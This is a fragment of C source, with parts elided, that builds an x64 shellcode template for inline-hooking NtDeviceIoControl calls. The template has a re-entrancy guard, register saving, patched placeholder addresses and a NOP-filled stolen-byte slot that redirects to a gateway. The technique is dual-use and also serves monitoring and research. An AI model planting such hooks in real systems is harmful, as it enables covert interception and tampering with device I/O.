...
UCHAR g_ShellcodeTemplate[] = {
    ...
    // ===== RE-ENTRANCY GUARD =====
    // [4] Check busy flag (FLAG_ADDR patched at offset 7)
    0x50,  // push rax
    ...
    // ===== SAVE VOLATILE REGISTERS (offset 44, was 40) =====
    0x50,       // push rax
    0x51,       // push rcx
    0x52,       // push rdx
    0x53,       // push rbx
    ...
    0x48, 0xB8, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x48, 0x89, 0x44, 0x24, 0x20,
    0x48, 0xB8, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0x48, 0x89, 0x44, 0x24, 0x28,
    0x48, 0xB8, 0xBC, 0xBC, 0xBC, 0xBC, 0xBC, 0xBC, 0xBC, 0xBC, 0x48, 0x89, 0x44, 0x24, 0x30,
    0x48, 0xB8, 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0x48, 0x89, 0x44, 0x24, 0x38,
    0x48, 0xB8, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0x48, 0x89, 0x44, 0x24, 0x40,
    // Arg1 = RCX (saved at [rsp + 0x120] after prologue)
    0x48, 0x8B, 0x84, 0x24, 0x20, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48,
    // Arg2 = RDX (saved at [rsp + 0x118] after prologue)
    0x48, 0x8B, 0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x50,
                          ...
                          _In_ PVOID TargetNtDeviceIo, _In_ ULONG IoControlCode)
{
    ...
    *(PVOID *)(shellcode + offNtDeviceIo) = TargetNtDeviceIo;
    ...
    // Keep inline stolen-byte slot as NOPs; control flow jumps to external gateway.
    RtlFillMemory(shellcode + offNopSled, 16, 0x90);
